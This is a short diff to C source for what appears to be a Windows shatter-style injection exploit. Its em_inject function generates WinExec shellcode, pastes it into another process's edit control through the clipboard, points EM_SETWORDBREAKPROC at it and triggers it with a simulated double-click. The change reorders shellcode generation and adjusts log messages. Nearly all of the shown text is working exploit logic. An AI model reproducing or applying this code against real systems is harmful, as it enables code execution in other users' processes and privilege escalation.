@@ -398,21 +398,22 @@ BOOL em_inject(void) {
       {
         printf("OK.\n");
         
+        printf("  [+] Generating shellcode for %p\n", embuf.p);
+        cs = cp1252_generate_winexec(pid, &cslen);
+        
+        printf("  [+] Injecting %i bytes of shellcode with WM_PASTE.\n", cslen);
+        CopyToClipboard(CF_TEXT, cs, cslen);
+        
         printf("  [+] Clearing buffer.\n");
         SendMessage(ecw, EM_SETSEL, 0, -1);
         SendMessage(ecw, WM_CLEAR, 0, 0);
         
-        printf("  [+] Generating shellcode for %p\n", embuf.p);
-        cs = cp1252_generate_winexec(pid, &cslen);
-        
-        printf("  [+] Injecting shellcode with WM_PASTE.\n");
-        CopyToClipboard(CF_TEXT, cs, cslen);
         SendMessage(ecw, WM_PASTE, 0, 0);
         Sleep(WAIT_TIME);
         
         printf("  [+] Setting EM_SETWORDBREAKPROC to shellcode at %p\n", embuf.p);
         SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
-
+   
         printf("  [+] Executing shellcode with WM_LBUTTONDBLCLK.\n");
         SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
         
